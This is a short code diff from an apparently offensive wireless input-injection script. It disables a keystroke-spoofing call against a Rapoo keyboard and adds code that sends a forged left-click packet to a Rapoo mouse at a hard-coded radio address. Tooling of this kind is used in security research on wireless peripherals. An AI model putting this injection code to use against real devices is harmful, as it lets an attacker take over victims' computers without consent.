@@ -82,4 +82,10 @@ attack = [
     rapoo_Keyboard.build_packet([KeyboardScancode.KEY_KEYPAD_ENTER])
     ]
 
-rapoo_Keyboard.spoof(attack)
+#rapoo_Keyboard.spoof(attack)
+
+rapoo_Mouse = Rapoo_Mouse("c7:92:78:79", 0x11021, 0xefdf)
+attack = [
+    rapoo_Mouse.build_packet([MouseClickType.LEFT_CLICK])
+]
+rapoo_Mouse.spoof(attack)
